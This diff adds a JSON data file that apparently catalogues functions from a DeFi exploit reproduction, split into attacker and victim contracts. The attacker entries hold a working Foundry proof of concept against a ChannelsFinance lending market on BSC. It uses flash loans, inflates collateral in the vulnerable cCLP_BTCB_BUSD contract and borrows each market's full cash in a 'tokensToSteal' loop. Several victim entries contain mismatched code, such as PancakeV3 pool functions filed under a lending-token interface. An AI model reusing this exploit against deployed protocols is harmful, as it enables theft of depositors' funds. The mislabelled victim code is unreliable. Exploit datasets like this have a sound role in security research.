@@ -1,0 +1,478 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeV3FlashCallback",
+    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        if (msg.sender == address(BUSDT_BTCB)) {\n            BUSDT_BUSD.flash(address(this), 0, 500_000e18, \"\");\n            BTCB.transfer(address(BUSDT_BTCB), 11_900e15 + fee1);\n        } else if (msg.sender == address(BUSDT_BUSD)) {\n            // Transfer token amounts to pair and next mint liquidity\n            (uint112 reserveBTCB, uint112 reserveBUSD,) = BTCB_BUSD.getReserves();\n            BTCB.transfer(address(BTCB_BUSD), (reserveBTCB * 115) / 100);\n            BUSD.transfer(address(BTCB_BUSD), (reserveBUSD * 115) / 100);\n            BTCB_BUSD.mint(address(this));\n            // Transfer PancakeSwapToken to vulnerable contract\n            PancakeSwapToken.transfer(address(cCLP_BTCB_BUSD), PancakeSwapToken.balanceOf(address(this)));\n\n            emit log_named_uint(\n                \"Exploiter underlying BTCB_BUSD tokens balance before transfer to vulnerable contract\",\n                BTCB_BUSD.balanceOf(address(this))\n            );\n\n            // Transfer BTCB_BUSD to vulnerable contract\n            BTCB_BUSD.transfer(address(cCLP_BTCB_BUSD), BTCB_BUSD.balanceOf(address(this)));\n\n            emit log_named_uint(\n                \"Exploiter underlying BTCB_BUSD tokens balance after transfer to vulnerable contract\",\n                BTCB_BUSD.balanceOf(address(this))\n            );\n\n            cCLP_BTCB_BUSD.accrueInterest();\n\n            // Enter to ChannelsFinance markets\n            address[] memory cTokens = Comptroller.getAllMarkets();\n            Comptroller.enterMarkets(cTokens);\n\n            // At this moment exploiter can borrow more tokens than he should\n            ICErc20Delegate[] memory tokensToSteal = new ICErc20Delegate[](7);\n            tokensToSteal[0] = cWBNB;\n            tokensToSteal[1] = cBUSD;\n            tokensToSteal[2] = cUSDT;\n            tokensToSteal[3] = cUSDC;\n            tokensToSteal[4] = cDAI;\n            tokensToSteal[5] = cETH;\n            tokensToSteal[6] = cBTC;\n\n            for (uint256 i; i < tokensToSteal.length; ++i) {\n                uint256 amountToSteal = tokensToSteal[i].getCash();\n                tokensToSteal[i].borrow(amountToSteal);\n            }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 34_806_205);\n        vm.label(address(cWBNB), \"cWBNB\");\n        vm.label(address(cFIL), \"cFIL\");\n        vm.label(address(cCLP_BTCB_BUSD), \"cCLP_BTCB_BUSD\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(BTCB), \"BTCB\");\n        vm.label(address(BUSD), \"BUSD\");\n        vm.label(address(PancakeSwapToken), \"PancakeSwapToken\");\n        vm.label(address(Comptroller), \"Comptroller\");\n        vm.label(address(BUSDT_BTCB), \"BUSDT_BTCB\");\n        vm.label(address(BUSDT_BUSD), \"BUSDT_BUSD\");\n        vm.label(address(BTCB_BUSD), \"BTCB_BUSD\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        // Starting balances. Exploiter transfered amounts of tokens to attack contract before first attack tx\n        // Transfer txs:\n        // PancakeSwap Token: https://app.blocksec.com/explorer/tx/bsc/0x0237855c63eb85c5f437fba5267cc869a08c58a49501e3e5ebec9990bdd97565\n        deal(address(PancakeSwapToken), address(this), 2e18);\n        deal(address(BUSDT), address(this), 0);\n\n        // At the end of the first tx attacker manipulated total supply value in vulnerable contract\n        // This step was needed for increase borrowing power of attacker\n        // I don't recreate the mentioned process because I have encountered specific underflow error when trying to liquidate borrowers positions\n        // in the first attack tx\n\n        emit log_named_decimal_uint(\n            \"Exploiter WBNB balance before attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter BUSD balance before attack\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter BUSDT balance before attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter BTCB balance before attack\", BTCB.balanceOf(address(this)), BTCB.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter ETHToken balance before attack\", ETHToken.balanceOf(address(this)), ETHToken.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDC balance before attack\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Exploiter DAI balance before attack\", DAI.balanceOf(address(this)), DAI.decimals());\n\n        emit log_string(\"-----------------------------------------------------\");\n\n        emit log_named_uint(\n            \"Total supply value in vulnerable contract after first attack tx\", cCLP_BTCB_BUSD.totalSupply()\n        );\n\n        emit log_named_uint(\n            \"Exploiter cCLP_BTCB_BUSD balance after first attack tx\", cCLP_BTCB_BUSD.balanceOf(attackContract)\n        );\n\n        // Transfer 2 tokens cCLP_BTCB_BUSD from attack contract to this contract.\n        // I do this because of complications with first tx explained above\n        // This step is needed to withdraw underlying BTCB_BUSD tokens later\n        vm.prank(attackContract);\n        cCLP_BTCB_BUSD.approve(address(this), type(uint256).max);\n        cCLP_BTCB_BUSD.transferFrom(attackContract, address(this), cCLP_BTCB_BUSD.balanceOf(attackContract));\n\n        BUSDT_BTCB.flash(address(this), 0, 11_900e15, \"\");\n\n        emit log_named_decimal_uint(\n            \"Exploiter WBNB balance after attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter BUSD balance after attack\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter BUSDT balance after attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter BTCB balance after attack\", BTCB.balanceOf(address(this)), BTCB.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter ETHToken balance after attack\", ETHToken.balanceOf(address(this)), ETHToken.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter USDC balance after attack\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Exploiter DAI balance after attack\", DAI.balanceOf(address(this)), DAI.decimals());\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_acceptAdmin",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_addReserves",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_becomeImplementation",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_delegateCompLikeTo",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_reduceReserves",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_resignImplementation",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_setComptroller",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_setInterestRateModel",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_setPendingAdmin",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "_setReserveFactor",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "accrualBlockNumber",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "accrueInterest",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "admin",
+    "original_code": "    function admin() external ifAdmin returns (address) {\n        return _admin();\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "  function allowance(address owner, address spender) external view returns (uint256) {\n    return _allowances[owner][spender];\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "  function approve(address spender, uint256 amount) external returns (bool) {\n    _approve(_msgSender(), spender, amount);\n    return true;\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "  function balanceOf(address account) external view returns (uint256) {\n    return _balances[account];\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "balanceOfUnderlying",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "borrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "borrowBalanceCurrent",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "borrowBalanceStored",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "borrowIndex",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "borrowRatePerBlock",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "comptroller",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "  function decimals() external view returns (uint8) {\n    return _decimals;\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "exchangeRateCurrent",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "exchangeRateStored",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "getAccountSnapshot",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "getCash",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "gulp",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "implementation",
+    "original_code": "    function implementation() external ifAdmin returns (address) {\n        return _implementation();\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "initialize",
+    "original_code": "    function initialize(uint160 sqrtPriceX96) external override {\n        require(slot0.sqrtPriceX96 == 0, 'AI');\n\n        int24 tick = TickMath.getTickAtSqrtRatio(sqrtPriceX96);\n\n        (uint16 cardinality, uint16 cardinalityNext) = observations.initialize(_blockTimestamp());\n\n        slot0 = Slot0({\n            sqrtPriceX96: sqrtPriceX96,\n            tick: tick,\n            observationIndex: 0,\n            observationCardinality: cardinality,\n            observationCardinalityNext: cardinalityNext,\n            feeProtocol: 209718400, // default value for all pools, 3200:3200, store 2 uint32 inside\n            unlocked: true\n        });\n\n        if (fee == 100) {\n            slot0.feeProtocol = 216272100; // value for 3300:3300, store 2 uint32 inside\n        } else if (fee == 500) {\n            slot0.feeProtocol = 222825800; // value for 3400:3400, store 2 uint32 inside\n        } else if (fee == 2500) {\n            slot0.feeProtocol = 209718400; // value for 3200:3200, store 2 uint32 inside\n        } else if (fee == 10000) {\n            slot0.feeProtocol = 209718400; // value for 3200:3200, store 2 uint32 inside\n        }\n\n        emit Initialize(sqrtPriceX96, tick);\n    }\n\n    struct ModifyPositionParams {\n        // the address that owns the position\n        address owner;\n        // the lower and upper tick of the position\n        int24 tickLower;\n        int24 tickUpper;\n        // any change in liquidity\n        int128 liquidityDelta;\n    }\n\n    /// @dev Effect some changes to a position\n    /// @param params the position details and the change to the position's liquidity to effect\n    /// @return position a storage pointer referencing the position with the given owner and tick range\n    /// @return amount0 the amount of token0 owed to the pool, negative if the pool should pay the recipient\n    /// @return amount1 the amount of token1 owed to the pool, negative if the pool should pay the recipient\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "interestRateModel",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "isCToken",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "liquidateBorrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "mint",
+    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external override lock returns (uint256 amount0, uint256 amount1) {\n        require(amount > 0);\n        (, int256 amount0Int, int256 amount1Int) = _modifyPosition(\n            ModifyPositionParams({\n                owner: recipient,\n                tickLower: tickLower,\n                tickUpper: tickUpper,\n                liquidityDelta: int256(amount).toInt128()\n            })\n        );\n\n        amount0 = uint256(amount0Int);\n        amount1 = uint256(amount1Int);\n\n        uint256 balance0Before;\n        uint256 balance1Before;\n        if (amount0 > 0) balance0Before = balance0();\n        if (amount1 > 0) balance1Before = balance1();\n        IPancakeV3MintCallback(msg.sender).pancakeV3MintCallback(amount0, amount1, data);\n        if (amount0 > 0) require(balance0Before.add(amount0) <= balance0(), 'M0');\n        if (amount1 > 0) require(balance1Before.add(amount1) <= balance1(), 'M1');\n\n        emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);\n    }\n\n    /// @inheritdoc IPancakeV3PoolActions\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "  function name() external view returns (string memory) {\n    return _name;\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "pendingAdmin",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "protocolSeizeShareMantissa",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "redeem",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "redeemUnderlying",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "repayBorrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "repayBorrowBehalf",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "reserveFactorMantissa",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "seize",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "supplyRatePerBlock",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "sweepToken",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "  function symbol() external view returns (string memory) {\n    return _symbol;\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "totalBorrows",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "totalBorrowsCurrent",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "totalReserves",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "  function totalSupply() external view returns (uint256) {\n    return _totalSupply;\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "  function transfer(address recipient, uint256 amount) external returns (bool) {\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.\n    /// @param from The account from which the tokens were sent, i.e. the balance decreased\n    /// @param to The account to which the tokens were sent, i.e. the balance increased\n    /// @param value The amount of tokens that were transferred\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.\n    /// @param owner The account that approved spending of its tokens\n    /// @param spender The account for which the spending allowance was modified\n    /// @param value The new allowance from the owner to the spender\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IcCLP_BTCB_BUSD",
+    "source_type": "victim_contract",
+    "function_name": "underlying",
+    "original_code": "",
+    "description": ""
+  }
+]
